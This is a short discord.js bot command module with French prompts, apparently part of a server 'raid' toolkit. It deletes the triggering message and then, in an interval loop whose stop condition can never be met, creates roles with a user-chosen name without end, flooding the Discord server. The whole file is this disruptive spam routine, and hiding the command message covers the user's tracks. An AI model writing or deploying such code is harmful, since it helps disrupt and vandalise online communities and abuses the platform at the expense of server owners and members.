//--by-NF5--//

const Discord = require('discord.js')

module.exports = {
 name:"roles + <nom des roles>",
execute: async(bot, message, args) => {
    let names = args.slice(1).join(" ")

    if(!names) return message.author.send("Veuillez saisir un nom de roles à créer")

    if (message.deletable) message.delete();
    message.react("👍")


 let inter = setInterval (function () { 
     
  if(0 === 100) clearInterval(inter);
  message.guild.roles.create({
      data: {
          name: `${names}`,
          color: 'RANDOM',
      }
  })
})
}}